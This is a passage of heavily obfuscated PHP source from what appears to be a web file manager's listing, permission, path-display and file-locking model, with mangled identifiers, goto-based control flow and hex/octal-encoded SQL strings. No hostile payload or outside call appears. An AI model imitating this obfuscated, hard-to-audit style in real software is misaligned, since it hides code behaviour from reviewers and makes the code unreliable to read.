"\123\105\114\105\103\x54\40\x2a\40\106\122\x4f\x4d\40\x28\123\x45\x4c\x45\103\x54\x20\x27{$bÉèÈ¶Í´ä}\137\x68\141\x73\106\x69\154\145\47\x20\141\x73\40\x68\x61\x73\x2c\x63\157\165\156\164\50\x31\x29\x20\x61\163\x20\150\x61\163\103\x6f\x75\156\164\x20\106\122\x4f\x4d\x20\x60{$F¢Æ¦Ñ©®}\140\40\12\11\x9\11\11\11\x77\x68\145\x72\145\x20\x70\x61\162\145\x6e\164\111\x44\75{$bÉèÈ¶Í´ä}\x20\x61\x6e\x64\40\x69\163\106\157\x6c\144\x65\162\x3d\x30\x20\x61\156\144\x20\151\163\104\x65\x6c\x65\x74\x65\75{$bµ—†÷Ã×ç}\x29\40\x61\x73\x20\164\142\x31\137{$bÉèÈ¶Í´ä}\x20\x75\156\151\157\x6e\40\x61\154\x6c\x20\xa\11\x9\x9\x9\x9\123\x45\x4c\105\x43\124\x20\52\x20\x46\x52\117\x4d\40\50\x53\105\114\x45\x43\x54\40\47{$bÉèÈ¶Í´ä}\x5f\150\141\x73\106\157\x6c\144\x65\162\x27\x20\141\163\x20\150\x61\x73\106\x69\154\145\54\143\157\165\x6e\164\50\x31\51\x20\141\x73\x20\x68\x61\x73\103\x6f\x75\x6e\x74\40\106\122\x4f\x4d\40\x60{$F¢Æ¦Ñ©®}\x60\x20\12\11\x9\x9\x9\x9\167\150\x65\162\x65\x20\160\141\x72\145\156\164\111\104\x3d{$bÉèÈ¶Í´ä}\40\x61\x6e\144\x20\151\163\106\157\x6c\x64\145\x72\x3d\61\x20\x61\x6e\x64\40\x69\x73\104\x65\x6c\145\164\x65\75{$bµ—†÷Ã×ç}\x29\x20\141\x73\40\x74\142\62\137{$bÉèÈ¶Í´ä}\40\165\x6e\151\157\156\x20\x61\154\154\x20"; } if ((strlen($B´î¶«ÑåÑ) >= $aÑ£ˆÑ½¨ || $FŠ·„†õ…Â == $dÏçëÈÄ¢İ - 1) && $B´î¶«ÑåÑ) { $B´î¶«ÑåÑ = substr($B´î¶«ÑåÑ, 0, -strlen($e¯ì¼ªæÈ½[449])); $F÷œíšî·› = $this->query($B´î¶«ÑåÑ); $dĞùó‰®ÖÓ = array_merge($dĞùó‰®ÖÓ, $F÷œíšî·›); $B´î¶«ÑåÑ = $e¯ì¼ªæÈ½[33]; } } $dĞùó‰®ÖÓ = array_to_keyvalue($dĞùó‰®ÖÓ, $e¯ì¼ªæÈ½[450]); goto eø¼¸‚¡Ïë; f™âğé’ÊÕ: $aÑ£ˆÑ½¨ = 1024 * 50; $CÃßñ™æÀ = is_array($CÃßñ™æÀ) ? $CÃßñ™æÀ : array(); $dÏçëÈÄ¢İ = count($CÃßñ™æÀ); goto EÙİ“ëĞæá; eø¼¸‚¡Ïë: foreach ($CÃßñ™æÀ as &$eëÍÉõ±Ø¹) { if ($eëÍÉõ±Ø¹[$e¯ì¼ªæÈ½[370]]) { unset($eëÍÉõ±Ø¹[$e¯ì¼ªæÈ½[372]]); $eëÍÉõ±Ø¹[$e¯ì¼ªæÈ½[192]] = intval($dĞùó‰®ÖÓ[$eëÍÉõ±Ø¹[$e¯ì¼ªæÈ½[369]] . $e¯ì¼ªæÈ½[451]][$e¯ì¼ªæÈ½[452]]); $eëÍÉõ±Ø¹[$e¯ì¼ªæÈ½[191]] = intval($dĞùó‰®ÖÓ[$eëÍÉõ±Ø¹[$e¯ì¼ªæÈ½[369]] . $e¯ì¼ªæÈ½[453]][$e¯ì¼ªæÈ½[452]]); } } goto dæˆêª·•”; Ağ¤‰­†Õ: $e¯ì¼ªæÈ½ =& $_SERVER[Î¿—”òá]; $B´î¶«ÑåÑ = $e¯ì¼ªæÈ½[361]; $dĞùó‰®ÖÓ = array(); goto f™âğé’ÊÕ; dæˆêª·•”: } protected function _listAppendAuth(&$BÎê½ÅÜ†) { goto A¼‡ßŠÅ‹ô; cİÜÑˆ†§: foreach ($BÎê½ÅÜ† as $aÂÚÊ¹ª¶) { if ($aÂÚÊ¹ª¶[$b™®Ş²šã[371]] == self::TYPE_GROUP) { $cøî‰º»ô©[] = $aÂÚÊ¹ª¶[$b™®Ş²šã[369]]; } } if (!$cøî‰º»ô©) { return; } $Aåƒ·ºÌÓ÷ = array_to_keyvalue($BÎê½ÅÜ†, $b™®Ş²šã[369]); goto c„ƒö¸©Ñ˜; A¼‡ßŠÅ‹ô: $b™®Ş²šã =& $_SERVER[Î¿—”òá]; if (!defined($b™®Ş²šã[427])) { return; } $cøî‰º»ô© = array(); goto cİÜÑˆ†§; c„ƒö¸©Ñ˜: $Dãè œİ¶Ë = Model($b™®Ş²šã[454])->getSourceList($cøî‰º»ô©, $Aåƒ·ºÌÓ÷); foreach ($BÎê½ÅÜ† as $Eší°¹µ­â => &$aÂÚÊ¹ª¶) { $aÂÚÊ¹ª¶[$b™®Ş²šã[376]] = $Dãè œİ¶Ë[$aÂÚÊ¹ª¶[$b™®Ş²šã[369]]]; if (!$aÂÚÊ¹ª¶[$b™®Ş²šã[376]] && $aÂÚÊ¹ª¶[$b™®Ş²šã[371]] == self::TYPE_GROUP) { $aÂÚÊ¹ª¶[$b™®Ş²šã[376]] = Action($b™®Ş²šã[455])->pathGroupAuthMake($aÂÚÊ¹ª¶[$b™®Ş²šã[456]]); if (!$aÂÚÊ¹ª¶[$b™®Ş²šã[376]] && !_get($GLOBALS, $b™®Ş²šã[457])) { $aÂÚÊ¹ª¶[$b™®Ş²šã[189]] = !1; $aÂÚÊ¹ª¶[$b™®Ş²šã[188]] = !1; } } if ($aÂÚÊ¹ª¶[$b™®Ş²šã[376]]) { $aÂÚÊ¹ª¶[$b™®Ş²šã[189]] = AuthModel::authCheckEdit($aÂÚÊ¹ª¶[$b™®Ş²šã[376]][$b™®Ş²šã[377]]); $aÂÚÊ¹ª¶[$b™®Ş²šã[188]] = AuthModel::authCheckView($aÂÚÊ¹ª¶[$b™®Ş²šã[376]][$b™®Ş²šã[377]]); } $this->groupPathDisplay($aÂÚÊ¹ª¶); } goto A†®†»ÁÎ·; A†®†»ÁÎ·: } public function groupPathDisplay(&$F’³äŞÙ¾å) { goto bÉ ŒŒí¦Ì; b†Ï±ÂĞ÷æ: $Eé–…¾’‹— = $this->parentLevelArray($Aùõ°Í¸À[$eìãË²¶ªœ[459]]); $E´æ•Ã‰Õ¢ = $eìãË²¶ªœ[33]; foreach ($Eé–…¾’‹— as $d¶çä’›ğƒ) { $EøÔÓ…Š† = Model($eìãË²¶ªœ[458])->getInfo($d¶çä’›ğƒ); $E´æ•Ã‰Õ¢ .= $EøÔÓ…Š†[$eìãË²¶ªœ[391]][$eìãË²¶ªœ[369]] . $eìãË²¶ªœ[47]; } goto DŸÌô¶®Ãº; DŸÌô¶®Ãº: $F’³äŞÙ¾å[$eìãË²¶ªœ[460]] = $Aùõ°Í¸À[$eìãË²¶ªœ[461]]; $F’³äŞÙ¾å[$eìãË²¶ªœ[380]] = $Aùõ°Í¸À[$eìãË²¶ªœ[459]]; $F’³äŞÙ¾å[$eìãË²¶ªœ[462]] = $Aùõ°Í¸À[$eìãË²¶ªœ[463]]; goto AÂàƒå¤²; bÉ ŒŒí¦Ì: $eìãË²¶ªœ =& $_SERVER[Î¿—”òá]; if ($F’³äŞÙ¾å[$eìãË²¶ªœ[371]] != self::TYPE_GROUP) { return; } $Aùõ°Í¸À = Model($eìãË²¶ªœ[458])->getInfo($F’³äŞÙ¾å[$eìãË²¶ªœ[456]]); goto b†Ï±ÂĞ÷æ; AÂàƒå¤²: $F’³äŞÙ¾å[$eìãË²¶ªœ[464]] = $E´æ•Ã‰Õ¢ . $Aùõ°Í¸À[$eìãË²¶ªœ[391]][$eìãË²¶ªœ[369]]; goto A¥Š„‹Å¥; A¥Š„‹Å¥: } protected function _listAppendPath(&$d¼…˜) { goto CïÌ­…É–ß; fÊí›§ Ø§: $FÇƒ—Œ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($d¼…˜ as &$Eôƒ°ºìÉ´) { goto Bè†î‰à¹ù; d¬åíİğë‚: if ($D‹¯ä®´ã) { $båò«¢ö” .= $Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[28]]; } if ($Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[370]]) { $båò«¢ö” .= $bÛÜ÷ÂÖ¼›[8]; } $Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[466]] = str_replace($bÛÜ÷ÂÖ¼›[467], $bÛÜ÷ÂÖ¼›[8], $båò«¢ö”); goto DéĞâ¶ª§; DéĞâ¶ª§: $b¾ĞÆ”Ö« = trim($Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[466]], $bÛÜ÷ÂÖ¼›[8]); if ($Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[461]] == $bÛÜ÷ÂÖ¼›[468] && $b¾ĞÆ”Ö«) { $Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[28]] = $b¾ĞÆ”Ö«; } $this->_listAppendPathRecycle($Eôƒ°ºìÉ´, $D‹¯ä®´ã, $FÇƒ—Œ); goto Eâ‹äÂßÒ™; Bè†î‰à¹ù: $D‹¯ä®´ã = $this->parentLevelArray($Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[459]]); $båò«¢ö” = $this->_listAppendPathRoot($Eôƒ°ºìÉ´, $D‹¯ä®´ã); foreach ($D‹¯ä®´ã as $fˆ—¶Óªƒ) { if (isset($Aİ¨‚Ğ­×[$fˆ—¶Óªƒ])) { $båò«¢ö” .= $Aİ¨‚Ğ­×[$fˆ—¶Óªƒ] . $bÛÜ÷ÂÖ¼›[8]; } } goto d¬åíİğë‚; Eâ‹äÂßÒ™: } goto c³©Ë™ì‹¶; cöÇ¿Öõñ: $B‹ğ„Èòì = array(); foreach ($Aİ¨‚Ğ­× as $DÇ¶»Ö–± => $Eß–©–í•) { if (!$Eß–©–í•) { $B‹ğ„Èòì[] = $DÇ¶»Ö–±; } } if ($B‹ğ„Èòì) { $F£¯«ËèÅò = array($bÛÜ÷ÂÖ¼›[383] => array($bÛÜ÷ÂÖ¼›[384], $B‹ğ„Èòì)); if (count($B‹ğ„Èòì) == 1) { $c…ï¹‹Ø…İ = $this->sourceInfo($B‹ğ„Èòì[0]); $c…ï¹‹Ø…İ = is_array($c…ï¹‹Ø…İ) ? array($c…ï¹‹Ø…İ) : !1; } else { $c…ï¹‹Ø…İ = $this->field($bÛÜ÷ÂÖ¼›[465])->where($F£¯«ËèÅò)->select(); } $fÔ™ãÚ±íõ = array_to_keyvalue($c…ï¹‹Ø…İ, $bÛÜ÷ÂÖ¼›[369], $bÛÜ÷ÂÖ¼›[28]); $Aİ¨‚Ğ­× = array_merge_index($Aİ¨‚Ğ­×, $fÔ™ãÚ±íõ); } goto fÊí›§ Ø§; CïÌ­…É–ß: $bÛÜ÷ÂÖ¼› =& $_SERVER[Î¿—”òá]; $Aİ¨‚Ğ­× = array(); foreach ($d¼…˜ as &$Eôƒ°ºìÉ´) { $Aİ¨‚Ğ­×[$Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[369]]] = $Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[28]]; $D‹¯ä®´ã = $this->parentLevelArray($Eôƒ°ºìÉ´[$bÛÜ÷ÂÖ¼›[459]]); array_shift($D‹¯ä®´ã); foreach ($D‹¯ä®´ã as $fˆ—¶Óªƒ) { if (!isset($Aİ¨‚Ğ­×[$fˆ—¶Óªƒ])) { $Aİ¨‚Ğ­×[$fˆ—¶Óªƒ] = 0; } } } goto cöÇ¿Öõñ; c³©Ë™ì‹¶: } private function _listAppendPathRecycle(&$D©†ãÁ‰­…, $DÈ²æ µ¬Ş, $A†óÕÅÚ°ğ) { goto aöå£»‡¾Ä; CÅ™Ûğ½ß: $fÔ–—”êª° = explode($dºê¼äÊÜ[8], trim($D©†ãÁ‰­…[$dºê¼äÊÜ[466]], $dºê¼äÊÜ[8])); $CÜ¡é÷©ä­ = implode($dºê¼äÊÜ[8], array_slice($fÔ–—”êª°, 2)); $D©†ãÁ‰­…[$dºê¼äÊÜ[466]] = $dºê¼äÊÜ[8] . LNG($dºê¼äÊÜ[469]) . $dºê¼äÊÜ[8] . ltrim($CÜ¡é÷©ä­, $dºê¼äÊÜ[8]); goto DÑ²‡š‰÷µ; DÑ²‡š‰÷µ: $D©†ãÁ‰­…[$dºê¼äÊÜ[459]] = $dºê¼äÊÜ[470] . implode($dºê¼äÊÜ[47], array_slice($DÈ²æ µ¬Ş, 1)) . $dºê¼äÊÜ[47]; if ($D©†ãÁ‰­…[$dºê¼äÊÜ[369]] == $A†óÕÅÚ°ğ) { $D©†ãÁ‰­…[$dºê¼äÊÜ[459]] = $dºê¼äÊÜ[470]; $D©†ãÁ‰­…[$dºê¼äÊÜ[461]] = $dºê¼äÊÜ[468]; $D©†ãÁ‰­…[$dºê¼äÊÜ[28]] = LNG($dºê¼äÊÜ[469]); } $D©†ãÁ‰­…[$dºê¼äÊÜ[471]] = $dºê¼äÊÜ[472]; goto dæêÜ±Ÿà«; aöå£»‡¾Ä: $dºê¼äÊÜ =& $_SERVER[Î¿—”òá]; if (intval($D©†ãÁ‰­…[$dºê¼äÊÜ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($A†óÕÅÚ°ğ, $DÈ²æ µ¬Ş) && $D©†ãÁ‰­…[$dºê¼äÊÜ[369]] != $A†óÕÅÚ°ğ) { return; } goto CÅ™Ûğ½ß; dæêÜ±Ÿà«: } protected function _listAppendPathRoot(&$F¾êœ÷óÌ, $bè¼ÑË¨¸Ş) { $f…©¬ŒºÅ¨ =& $_SERVER[Î¿—”òá]; $cÂêàİ¤Ñ = $f…©¬ŒºÅ¨[33]; if ($F¾êœ÷óÌ[$f…©¬ŒºÅ¨[371]] == self::TYPE_USER) { if (defined($f…©¬ŒºÅ¨[427]) && $F¾êœ÷óÌ[$f…©¬ŒºÅ¨[456]] == USER_ID) { $cÂêàİ¤Ñ = LNG($f…©¬ŒºÅ¨[473]); if (!$bè¼ÑË¨¸Ş) { $F¾êœ÷óÌ[$f…©¬ŒºÅ¨[28]] = $cÂêàİ¤Ñ; } } else { $fŞªƒâ¢Ï = Model($f…©¬ŒºÅ¨[474])->getInfoSimple($F¾êœ÷óÌ[$f…©¬ŒºÅ¨[456]]); $cÂêàİ¤Ñ = LNG($f…©¬ŒºÅ¨[475]) . $f…©¬ŒºÅ¨[157] . $fŞªƒâ¢Ï[$f…©¬ŒºÅ¨[28]] . $f…©¬ŒºÅ¨[476]; } } else { if ($F¾êœ÷óÌ[$f…©¬ŒºÅ¨[371]] == self::TYPE_GROUP) { $fŞªƒâ¢Ï = Model($f…©¬ŒºÅ¨[458])->getInfoSimple($F¾êœ÷óÌ[$f…©¬ŒºÅ¨[456]]); $cÂêàİ¤Ñ = $fŞªƒâ¢Ï[$f…©¬ŒºÅ¨[28]]; } else { if ($F¾êœ÷óÌ[$f…©¬ŒºÅ¨[371]] == self::TYPE_SYSTEM) { $fŞªƒâ¢Ï = $this->sourceInfo($bè¼ÑË¨¸Ş[0], !0); $cÂêàİ¤Ñ = $fŞªƒâ¢Ï[$f…©¬ŒºÅ¨[28]]; } } } $cÂêàİ¤Ñ = $cÂêàİ¤Ñ ? $f…©¬ŒºÅ¨[8] . $cÂêàİ¤Ñ . $f…©¬ŒºÅ¨[8] : $f…©¬ŒºÅ¨[8]; return $cÂêàİ¤Ñ; } protected function _listAppendUser(&$b¢Ñ¸‡Ñ¨¶) { $d’ÛèÎù‹Ê =& $_SERVER[Î¿—”òá]; $Dì„Ñ‹î‡ = array_to_keyvalue($b¢Ñ¸‡Ñ¨¶, $d’ÛèÎù‹Ê[33], $d’ÛèÎù‹Ê[378]); $A§îÆºˆ«É = array_to_keyvalue($b¢Ñ¸‡Ñ¨¶, $d’ÛèÎù‹Ê[33], $d’ÛèÎù‹Ê[379]); $Cõ£¢é¢ô² = array_merge($Dì„Ñ‹î‡, $A§îÆºˆ«É); $cçŸªÁºÔÒ = Model($d’ÛèÎù‹Ê[477])->userListInfo($Cõ£¢é¢ô²); foreach ($b¢Ñ¸‡Ñ¨¶ as &$B¶êàé‰äŒ) { $fèÜĞğºéš = $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[378]]; $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[378]] = $cçŸªÁºÔÒ[$fèÜĞğºéš] ? $cçŸªÁºÔÒ[$fèÜĞğºéš] : !1; $fèÜĞğºéš = $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[379]]; $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[379]] = $cçŸªÁºÔÒ[$fèÜĞğºéš] ? $cçŸªÁºÔÒ[$fèÜĞğºéš] : !1; if (isset($B¶êàé‰äŒ[$d’ÛèÎù‹Ê[417]]) && $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[417]][$d’ÛèÎù‹Ê[478]]) { $C·ø±¥‹¦  = $GLOBALS[$d’ÛèÎù‹Ê[6]][$d’ÛèÎù‹Ê[84]][$d’ÛèÎù‹Ê[479]]; if ($B¶êàé‰äŒ[$d’ÛèÎù‹Ê[417]][$d’ÛèÎù‹Ê[480]] <= time() - $C·ø±¥‹¦ ) { $this->metaSet($B¶êàé‰äŒ[$d’ÛèÎù‹Ê[369]], $d’ÛèÎù‹Ê[478], null); $this->metaSet($B¶êàé‰äŒ[$d’ÛèÎù‹Ê[369]], $d’ÛèÎù‹Ê[480], null); unset($B¶êàé‰äŒ[$d’ÛèÎù‹Ê[417]][$d’ÛèÎù‹Ê[478]]); continue; } $F”÷ÖØ“»ë = $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[417]][$d’ÛèÎù‹Ê[478]]; $B¶êàé‰äŒ[$d’ÛèÎù‹Ê[417]][$d’ÛèÎù‹Ê[481]] = Model($d’ÛèÎù‹Ê[477])->getInfoSimpleOuter($F”÷ÖØ“»ë); } } } public function parentLevelArray($fÃ°é´Ñç) { $A¿ô†Ş°Ú =& $_SERVER[Î¿—”òá]; $fÃ°é´Ñç = explode($A¿ô†Ş°Ú[47], trim($fÃ°é´Ñç, $A¿ô†Ş°Ú[47])); return array_remove_value($fÃ°é´Ñç, $A¿ô†Ş°Ú[468]); } public function listAll($BÇ×Ä×¢…) { goto dŒåÛ¼´Õ; f£¬ÅÒ®²: $this->_listAppendAuth($e´İš„¦); $this->_listAppendUser($e´İš„¦); $this->_listAppendPath($e´İš„¦); goto bšøÖ«°‡ø; bšøÖ«°‡ø: $e´İš„¦ = array_to_keyvalue($e´İš„¦, $AÍ¯’˜†¢‹[369]); $EŠ±†œß© = "\57{$dê¿é¡¬¦­[$AÍ¯’˜†¢‹[28]]}\x2f"; $EŠ±†œß© = $EŠ±†œß© == $AÍ¯’˜†¢‹[467] ? $AÍ¯’˜†¢‹[8] : $EŠ±†œß©; goto fÕá££†‚Æ; dŒåÛ¼´Õ: $AÍ¯’˜†¢‹ =& $_SERVER[Î¿—”òá]; $dê¿é¡¬¦­ = $this->sourceInfo($BÇ×Ä×¢…); $c—†çî› ² = array($AÍ¯’˜†¢‹[482] => array($AÍ¯’˜†¢‹[483], $dê¿é¡¬¦­[$AÍ¯’˜†¢‹[459]] . $BÇ×Ä×¢… . $AÍ¯’˜†¢‹[484]), $AÍ¯’˜†¢‹[485] => 0); goto d‹«êóõˆ‘; fÕá££†‚Æ: $F°Èå…‡‰­ = array(); foreach ($e´İš„¦ as $Cé˜ŞŠ´¼¢ => $b²¿é¯„É¸) { goto f¨ÑïŠ²Å¨; B§ÕÂÀÀ•ˆ: if (!$b²¿é¯„É¸[$AÍ¯’˜†¢‹[370]]) { $CÎ›Ë„……[$AÍ¯’˜†¢‹[419]] = $b²¿é¯„É¸[$AÍ¯’˜†¢‹[419]]; $CÎ›Ë„……[$AÍ¯’˜†¢‹[489]] = $b²¿é¯„É¸[$AÍ¯’˜†¢‹[75]]; } $F°Èå…‡‰­[] = $CÎ›Ë„……; goto B´·‘»‘¯’; bì¿÷ù„È : $C±‘˜°Ó…ñ = str_replace($AÍ¯’˜†¢‹[467], $AÍ¯’˜†¢‹[8], $C±‘˜°Ó…ñ); $C±‘˜°Ó…ñ = str_replace($AÍ¯’˜†¢‹[467], $AÍ¯’˜†¢‹[8], $C±‘˜°Ó…ñ); $CÎ›Ë„…… = array($AÍ¯’˜†¢‹[387] => str_replace($AÍ¯’˜†¢‹[467], $AÍ¯’˜†¢‹[8], $C±‘˜°Ó…ñ), $AÍ¯’˜†¢‹[488] => intval($b²¿é¯„É¸[$AÍ¯’˜†¢‹[370]]), $AÍ¯’˜†¢‹[391] => $this->pathInfoFilter($b²¿é¯„É¸, !0)); goto B§ÕÂÀÀ•ˆ; d³±¶ï©ô: for ($cß«ÆŞá¬œ = 0; $cß«ÆŞá¬œ < count($C§›¥•õß); $cß«ÆŞá¬œ++) { $C±‘˜°Ó…ñ .= $e´İš„¦[$C§›¥•õß[$cß«ÆŞá¬œ]][$AÍ¯’˜†¢‹[28]] . $AÍ¯’˜†¢‹[8]; } $C±‘˜°Ó…ñ .= $b²¿é¯„É¸[$AÍ¯’˜†¢‹[28]]; if ($b²¿é¯„É¸[$AÍ¯’˜†¢‹[370]]) { $C±‘˜°Ó…ñ .= $AÍ¯’˜†¢‹[8]; } goto bì¿÷ù„È ; f¨ÑïŠ²Å¨: $C§›¥•õß = $this->parentLevelArray($b²¿é¯„É¸[$AÍ¯’˜†¢‹[459]]); array_shift($C§›¥•õß); $C±‘˜°Ó…ñ = $EŠ±†œß©; goto d³±¶ï©ô; B´·‘»‘¯’: } return $F°Èå…‡‰­; goto CòøÚ×Ì‹Ø; d‹«êóõˆ‘: $CÉ«øÍÑÍÌ = $AÍ¯’˜†¢‹[486]; $Fº ´Õ—„ñ = "\114\105\x46\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\151\157\137\146\151\x6c\x65\40\146\151\x6c\x65\40\x6f\x6e\x20\x73\157\165\x72\x63\x65\56\x66\x69\x6c\x65\111\104\40\75\x20\x66\151\154\x65\56\x66\x69\154\x65\111\x44"; $e´İš„¦ = $this->alias($AÍ¯’˜†¢‹[487])->field($CÉ«øÍÑÍÌ)->where($c—†çî› ²)->join($Fº ´Õ—„ñ)->select(); goto f£¬ÅÒ®²; CòøÚ×Ì‹Ø: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($fŠõŠŸŒ”¾) { goto b¦‰İ £ªÖ; A®òÀã¬“Ğ: $this->_lockEvent($fŠõŠŸŒ”¾, array($dÙï®ø½ æ[493], $dÙï®ø½ æ[494]), $Eƒôôˆ«˜ò); $this->_lockCheckEnd($dÙï®ø½ æ[490], $fŠõŠŸŒ”¾); goto F‰µÍ½ÈÂ‡; b¦‰İ £ªÖ: $dÙï®ø½ æ =& $_SERVER[Î¿—”òá]; if (!$this->allowLock()) { return; } $this->_lockCheck($dÙï®ø½ æ[490], $fŠõŠŸŒ”¾); goto F’ìöîÛ¢˜; F’ìöîÛ¢˜: $Eƒôôˆ«˜ò = 1; $this->_lockEvent($fŠõŠŸŒ”¾, array($dÙï®ø½ æ[491], $dÙï®ø½ æ[492]), $Eƒôôˆ«˜ò); $this->_lockParent($fŠõŠŸŒ”¾, array($dÙï®ø½ æ[492]), $Eƒôôˆ«˜ò); goto A®òÀã¬“Ğ; F‰µÍ½ÈÂ‡: } public function lockCopyEnd($e›¡ğ´“ƒİ) { $d¯­Ê…‰‡Ü =& $_SERVER[Î¿—”òá]; if (!$this->allowLock()) { return; } $EáÕ´öĞ™ = 0; $this->_lockEvent($e›¡ğ´“ƒİ, array($d¯­Ê…‰‡Ü[491], $d¯­Ê…‰‡Ü[492]), $EáÕ´öĞ™); $this->_lockParent($e›¡ğ´“ƒİ, array($d¯­Ê…‰‡Ü[492]), $EáÕ´öĞ™); $this->_lockEvent($e›¡ğ´“ƒİ, array($d¯­Ê…‰‡Ü[493], $d¯­Ê…‰‡Ü[494]), $EáÕ´öĞ™); } public function lockWriteStart($d”ìÌ©ªµ—, $B¥¸¤ç¯¬ = '') { goto eæŠçßæ‚·; C²‡áåÉÍß: $d¨É†‡Ïé = 1; $this->_lockKey($dÊ®Ø›øÕõ[495] . $d”ìÌ©ªµ— . $dÊ®Ø›øÕõ[91] . $B¥¸¤ç¯¬, $d¨É†‡Ïé); $this->_lockEvent($d”ìÌ©ªµ—, array($dÊ®Ø›øÕõ[490], $dÊ®Ø›øÕõ[492]), $d¨É†‡Ïé); goto A²Ã‹ø‹‚‘; A²Ã‹ø‹‚‘: $this->_lockParent($d”ìÌ©ªµ—, array($dÊ®Ø›øÕõ[490], $dÊ®Ø›øÕõ[492]), $d¨É†‡Ïé); $this->_lockCheckEnd($dÊ®Ø›øÕõ[491], $d”ìÌ©ªµ—); goto aæ÷‹ùé‡·; eæŠçßæ‚·: $dÊ®Ø›øÕõ =& $_SERVER[Î¿—”òá]; if (!$this->allowLock()) { return; } $this->_lockCheck($dÊ®Ø›øÕõ[491], $d”ìÌ©ªµ—); goto C²‡áåÉÍß; aæ÷‹ùé‡·: } public function lockWriteEnd($d©¼ØÓâ‰, $FİÇ©´Äé = '') { $bŒ×µ­œ« =& $_SERVER[Î¿—”òá]; if (!$this->allowLock()) { return; } $b¿ÄêÜ²¥ç = 0; $this->_lockKey($bŒ×µ­œ«[495] . $d©¼ØÓâ‰ . $bŒ×µ­œ«[91] . $FİÇ©´Äé, $b¿ÄêÜ²¥ç); $this->_lockEvent($d©¼ØÓâ‰, array($bŒ×µ­œ«[490], $bŒ×µ­œ«[492]), $b¿ÄêÜ²¥ç); $this->_lockParent($d©¼ØÓâ‰, array($bŒ×µ­œ«[490], $bŒ×µ­œ«[492]), $b¿ÄêÜ²¥ç); } public function lockMoveStart($F‰òÑÌÔµ) { goto a¿«ï¦÷ˆ; a÷³º†¶õÙ: $this->_lockParent($F‰òÑÌÔµ, array($Fé¨»²İğ÷[490], $Fé¨»²İğ÷[492]), $CÂÉÓÁ§àµ); $this->_lockEvent($F‰òÑÌÔµ, array($Fé¨»²İğ÷[497], $Fé¨»²İğ÷[493], $Fé¨»²İğ÷[494]), $CÂÉÓÁ§àµ); $this->_lockCheckEnd($Fé¨»²İğ÷[492], $F‰òÑÌÔµ); goto B‰’¾„ßó; a¿«ï¦÷ˆ: $Fé¨»²İğ÷ =& $_SERVER[Î¿—”òá]; if (!$this->allowLock()) { return; } $this->_lockCheck($Fé¨»²İğ÷[492], $F‰òÑÌÔµ); goto f¬î‚ÄœÇê; f¬î‚ÄœÇê: $CÂÉÓÁ§àµ = 1; $this->_lockKey($Fé¨»²İğ÷[496] . $F‰òÑÌÔµ, $CÂÉÓÁ§àµ); $this->_lockEvent($F‰òÑÌÔµ, array($Fé¨»²İğ÷[490], $Fé¨»²İğ÷[491]), $CÂÉÓÁ§àµ); goto a÷³º†¶õÙ; B‰’¾„ßó: } public function lockMoveEnd($bóÅÆ•áÆÀ) { goto DÓ¼Ää•Ğù; B‹…ÌĞšÔ: $this->_lockKey($E–ö¾íçÅÃ[496] . $bóÅÆ•áÆÀ, $Eª÷œÎÌ»); $this->_lockEvent($bóÅÆ•áÆÀ, array($E–ö¾íçÅÃ[490], $E–ö¾íçÅÃ[491]), $Eª÷œÎÌ»); $this->_lockParent($bóÅÆ•áÆÀ, array($E–ö¾íçÅÃ[490], $E–ö¾íçÅÃ[492]), $Eª÷œÎÌ»); goto D´ŒÑÇ»´ˆ; D´ŒÑÇ»´ˆ: $this->_lockEvent($bóÅÆ•áÆÀ, array($E–ö¾íçÅÃ[497], $E–ö¾íçÅÃ[493], $E–ö¾íçÅÃ[494]), $Eª÷œÎÌ»); goto b¥®¨Õˆ³æ; DÓ¼Ää•Ğù: $E–ö¾íçÅÃ =& $_SERVER[Î¿—”òá]; if (!$this->allowLock()) { return; } $Eª÷œÎÌ» = 0; goto B‹…ÌĞšÔ; b¥®¨Õˆ³æ: } private function _lockCheck($FÆìÀÃŸø, $bõãƒª³ß) { goto E¥÷¿ÌÂÓ£; dÛÖ±½ùˆ«: $this->_lockTimeStart[$AŞõ°çÇ³í] = timeFloat(); if (!is_array($dÌ“¾àÁ‡³)) { return; } $CÄœ×İçò = LNG($bç½¡Î‘­£[498]); goto C‡å˜ˆÏç; C‡å˜ˆÏç: CacheLock::setErrorMsg($bç½¡Î‘­£[157] . htmlspecialchars($dÌ“¾àÁ‡³[$bç½¡Î‘­£[28]]) . $bç½¡Î‘­£[476] . $CÄœ×İçò); $this->_lockKey($AŞõ°çÇ³í, 1); $this->_lockKey($AŞõ°çÇ³í, 0); goto aê»ÔÌ•¸; E¥÷¿ÌÂÓ£: $bç½¡Î‘­£ =& $_SERVER[Î¿—”òá]; $dÌ“¾àÁ‡³ = $this->sourceInfo($bõãƒª³ß); $AŞõ°çÇ³í = $FÆìÀÃŸø . $bç½¡Î‘­£[91] . $bõãƒª³ß; goto dÛÖ±½ùˆ«; aê»ÔÌ•¸: $a¸·Îˆ‰£ = array_reverse($this->parentLevelArray($dÌ“¾àÁ‡³[$bç½¡Î‘­£[459]])); foreach ($a¸·Îˆ‰£ as $A¹ô×¶÷ôŞ) { $AŞõ°çÇ³í = $FÆìÀÃŸø . $bç½¡Î‘­£[499] . $A¹ô×¶÷ôŞ; if (CacheLock::lockGet($bç½¡Î‘­£[500] . $AŞõ°çÇ³í)) { $dÌ“¾àÁ‡³ = $this->sourceInfo($A¹ô×¶÷ôŞ); CacheLock::setErrorMsg($bç½¡Î‘­£[157] . htmlspecialchars($dÌ“¾àÁ‡³[$bç½¡Î‘­£[28]]) . $bç½¡Î‘­£[476] . 